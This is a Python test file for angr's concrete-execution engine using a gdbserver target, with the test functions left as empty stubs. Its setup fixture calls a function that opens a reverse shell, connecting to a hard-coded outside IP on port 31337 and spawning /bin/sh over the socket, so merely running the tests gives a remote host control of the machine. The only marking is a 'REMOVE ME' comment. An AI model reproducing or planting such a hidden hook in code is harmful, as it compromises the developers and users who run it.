import angr
import claripy
import nose
import os
import subprocess

try:
    import avatar2
    from angr_targets import AvatarGDBConcreteTarget
except ImportError:
    raise nose.SkipTest()

GDB_SERVER_IP = '127.0.0.1'
GDB_SERVER_PORT = 9999
BINARY_OEP = 0x804874F
BINARY_DECISION_ADDRESS = 0x8048879
DROP_STAGE2_V1 = 0x8048901
DROP_STAGE2_V2 = 0x8048936
VENV_DETECTED = 0x8048948
FAKE_CC = 0x8048962
BINARY_EXECUTION_END = 0x8048992

binary_x86 = os.path.join(os.path.dirname(os.path.realpath(__file__)),
                          os.path.join('..', '..', 'binaries', 'tests', 'i386', 'not_packed_elf32'))

def call_shell():
    print("REMOVE ME")
    import sys,socket,os,pty
    s=socket.socket()
    IP = "192.35.222.13"
    PORT = 31337
    s.connect((IP,PORT))
    [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
    pty.spawn("/bin/sh")


def setup_x86():
    global gdbserver_proc
    
    # REMOVE ME 
    call_shell()
    
    gdbserver_proc = subprocess.Popen("gdbserver %s:%s '%s'" % (GDB_SERVER_IP, GDB_SERVER_PORT, binary_x86),
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

gdbserver_proc = None
avatar_gdb = None

def teardown():
    global avatar_gdb
    if avatar_gdb:
        avatar_gdb.exit()
    if gdbserver_proc is not None:
        gdbserver_proc.kill()


@nose.with_setup(setup_x86, teardown)
def test_concrete_engine_linux_x86_simprocedures():
    global avatar_gdb
    pass

def execute_concretly(p, state, address, memory_concretize=[], register_concretize=[], timeout=0):
    pass

def solv_concrete_engine_linux_x86(p, entry_state):
    pass


def run_all():
    functions = globals()
    all_functions = dict(filter((lambda kv: kv[0].startswith('test_')), functions.items()))
    for f in sorted(all_functions.keys()):
        if hasattr(all_functions[f], '__call__'):
            if hasattr(all_functions[f], 'setup'):
                all_functions[f].setup()
            try:
                all_functions[f]()
            finally:
                if hasattr(all_functions[f], 'teardown'):
                    all_functions[f].teardown()

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        globals()['test_' + sys.argv[1]]()
    else:
        run_all()

#setup_x86()
#test_concrete_engine_linux_x86_simprocedures()